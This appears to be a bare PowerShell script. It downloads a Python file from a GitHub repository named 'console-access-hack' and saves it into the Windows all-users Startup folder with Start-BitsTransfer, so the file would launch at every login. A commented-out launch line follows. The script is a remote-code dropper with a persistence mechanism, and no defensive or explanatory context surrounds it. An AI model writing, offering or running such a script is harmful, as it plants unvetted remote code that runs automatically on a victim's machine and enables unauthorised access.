$url = "https://raw.githubusercontent.com/keltonxgame/console-access-hack/main/console.py"
$dest = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

Start-BitsTransfer -Source $url -Destination $dest 

# start "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"

# exit
